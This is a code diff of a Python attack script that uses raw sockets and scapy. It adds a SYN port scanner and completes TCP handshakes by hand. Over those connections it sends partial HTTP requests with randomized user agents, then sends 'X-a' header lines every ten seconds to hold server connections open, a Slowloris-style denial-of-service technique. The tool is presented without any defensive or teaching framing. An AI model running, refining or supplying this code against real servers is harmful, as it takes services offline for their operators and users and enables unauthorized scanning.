@@ -1,15 +1,18 @@
+print('Preparation: Import libraries...')
 import TCPackets
 import Sniffer_TCP
 import socket
 import random
 import asyncio
 import time
+from scapy.all import *
 
 src_ip = ''
 dst_ip = ''
 dst_port = 80
 sniffer = Sniffer_TCP.Sniffer(src_ip)
 connections = []
+
 
 user_agents = [
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
@@ -39,6 +42,21 @@ user_agents = [
     "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
 ]
 
+def ports_scanner(dst_ip):
+	print('Scanning open ports at {}...'.format(dst_ip))
+	open_ports = list()
+	packet = IP(dst=dst_ip)/TCP(dport=(1,443),flags='S')
+	res, unans = sr(packet, timeout=10, verbose=False)
+	for i in res:
+		if i[1][1].flags == 18:
+			open_ports.append(i[1].sport)
+
+	if open_ports:
+		print('Open ports on {}: {}\n'.format(dst_ip, open_ports))
+	else:
+		print('Host {} has no open ports.'.format(dst_ip))
+	return open_ports
+
 def free_ports_init():
 	free_ports = list()
 	for i in range(65535):
@@ -56,7 +74,6 @@ class Connection():
 
 
 async def send_syn():
-	print('SYN')
 	global src_ip
 	global dst_ip
 	global dst_port
@@ -71,20 +88,18 @@ async def send_syn():
 	packet = TCPackets.TCPPacket(src_ip, src_port, dst_ip, dst_port, flags)
 	sniffer.ip = src_ip
 	i = 0
-	print('START')
+
 	output_packets = 0
-	#while True:
 	t = time.time()
-	for i in range(10000):
-		#print('*** *** OUTPUT = {} *** ***'.format(output_packets))
+	for i in range(1000):
 		s.sendto(packet.build(), (dst_ip, dst_port))
 		packet.seq = random.randint(0, 4294967295)
 		src_port = random.choice(free_ports)
 		free_ports.remove(src_port)
 		packet.src_port = src_port
-		await asyncio.sleep(0)
+		await asyncio.sleep(0.01)
 		output_packets += 1
-	print(time.time() - t)
+	print('1000 connections were made in {} seconds'.format(time.time() - t))
 
 async def connect():
 
@@ -94,19 +109,19 @@ async def connect():
 	global dst_port
 	global connections
 	global user_agents
+	global free_ports
 
 	ports = list()
 
 	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
 
 	while True:
-		#print( 'LEN STACK = {}'.format(len(sniffer.TCP_stack)))
 
 		if sniffer.TCP_stack:
 
 			response_packet = sniffer.TCP_stack[0]
 
-			if (response_packet.flags['S'] and response_packet.flags['A']) and (response_packet.dst_port not in ports):
+			if (response_packet.flags['S'] and response_packet.flags['A']):
 				flags = 0b00010000 #ACK flag
 				packet = TCPackets.TCPPacket(src_ip, response_packet.dst_port, dst_ip, dst_port, flags)
 				packet.seq = response_packet.ack
@@ -115,17 +130,34 @@ async def connect():
 				s.sendto(packet.build(), (dst_ip, dst_port))
 				ports.append(packet.src_port)
 
-				packet.flags = 0b00011000 #ACK and PSH
+				packet = IP(dst=dst_ip)/TCP(sport=response_packet.dst_port, dport=dst_port, flags='PA', seq=response_packet.ack, ack=response_packet.seq+1)
 				
-				data = ('GET /?{} HTTP/1.1\r\n'.format(random.randint(0, 2000)) + 'User-Agent: {}\r\n'.format(random.choice(user_agents)) + "{}\r\n".format("Accept-language: en-US,en,q=0.5")).encode('utf-8')
-				packet.window = len(data)
-				s.sendto(packet.build() + data, (dst_ip, dst_port))
+				data = ('GET /?{} HTTP/1.1\r\n'.format(random.randint(0, 2000)) + 'User-Agent: {}\r\n'.format(random.choice(user_agents)) + "{}\r\n".format("Accept-language: en-US,en,q=0.5"))
+								
+				send(packet/data, verbose=False)
+				#con = Connection(src_ip, response_packet.dst_port, response_packet.seq, response_packet.ack)
+				#connections.append(con)
+				
 
-				con = Connection(src_ip, packet.src_port, packet.ack, packet.seq + len(data))
+			elif response_packet.flags['A'] and not response_packet.flags['S'] and not response_packet.flags['F']:
+				con = Connection(src_ip, response_packet.dst_port, response_packet.seq, response_packet.ack)
 				connections.append(con)
-			
-			sniffer.TCP_stack.pop(0)
 
+			elif response_packet.flags['F']:
+				#print('- 1 Connection')
+				packet = IP(dst=dst_ip)/TCP(sport=response_packet.dst_port, dport=dst_port, flags='A', seq=response_packet.ack, ack=response_packet.seq+1)
+				send(packet, verbose=False)
+				
+				if response_packet.dst_port in ports:				
+					ports.remove(response_packet.dst_port)
+				
+				src_port = random.choice(free_ports)
+				free_ports.remove(src_port)
+				packet = TCPackets.TCPPacket(src_ip, src_port, dst_ip, dst_port, 0b00000010)
+				packet.seq = random.randint(0, 4294967295)
+				s.sendto(packet.build(), (dst_ip, dst_port))
+				
+			sniffer.TCP_stack.pop(0)
 
 		await asyncio.sleep(0)
 
@@ -135,25 +167,19 @@ async def keep_connection_open():
 	global src_ip
 	global dst_ip
 	global dst_port
-
-	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-	packet = TCPackets.TCPPacket(src_ip, None, dst_ip, dst_port, 0b00011000)
 	
 	while True:
-		print('-------- {} CONNECTIONS KEEPING OPEN---------'.format(len(connections)))
-		for conn in connections:
-			packet.src_host = conn.src_ip
-			packet.src_port = conn.src_port
-			packet.ack = conn.ack
-			packet.seq = conn.seq
+		if len(connections) != 0:
+			print('-------- {} CONNECTIONS KEEPING OPEN---------'.format(len(connections)))
 		
-			data = ('X-a: {}\r\n'.format(random.randint(0, 5000)).encode('utf-8'))
-			packet.window = len(data)
-			
-			s.sendto(packet.build() + data, (dst_ip, dst_port))
-			conn.seq = conn.seq + len(data)
-			
-
+		for conn in connections:
+			packet = IP(dst=dst_ip)/TCP(sport=conn.src_port, dport=dst_port, flags='A', seq=conn.seq, ack=conn.ack)
+			data = ('X-a: {}\r\n'.format(random.randint(0, 5000)))
+			send(packet/data, verbose=False)
+			await asyncio.sleep(0)
+		
+		connections = list()
+		
 		await asyncio.sleep(10)
 		
 		
@@ -161,6 +187,7 @@ async def keep_connection_open():
 				
 
 async def main_loop():
+	global sniffer
 	t1 = asyncio.create_task(send_syn())
 	t2 = asyncio.create_task(connect())
 	t3 = asyncio.create_task(sniffer.sniff())
